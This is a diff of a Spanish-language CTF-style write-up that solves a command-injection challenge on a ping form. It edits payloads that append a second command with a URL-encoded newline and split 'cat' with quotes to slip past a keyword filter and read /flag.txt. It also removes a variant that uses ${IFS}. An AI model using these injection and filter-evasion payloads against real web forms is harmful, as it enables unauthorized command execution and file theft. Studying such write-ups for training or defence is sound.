@@ -257,7 +257,7 @@ ping -c 2 8.8.8.8
 c'a't /flag.txt
 ```
 
-#### Opción B — `${IFS}` sustituido por espacio usando `%0A`
+#### Opción B — `%20` sustituido por espacio usando `%0A`
 
 `cat` está bloqueado como palabra literal. Dividirlo con comillas lo evita:
 ```
@@ -265,11 +265,6 @@ c'a't /flag.txt     ← válido en bash, elude el regex de "cat"
 ```
 
 `$` está bloqueado. En su lugar usar `%0A` como separador:
-```
-target=8.8.8.8%0Ac'a't${IFS}/flag.txt
-```
-
-Pero como `$` está bloqueado, usar la ruta directamente con espacio literal vía URL:
 ```
 target=8.8.8.8%0Ac'a't%20/flag.txt
 ```
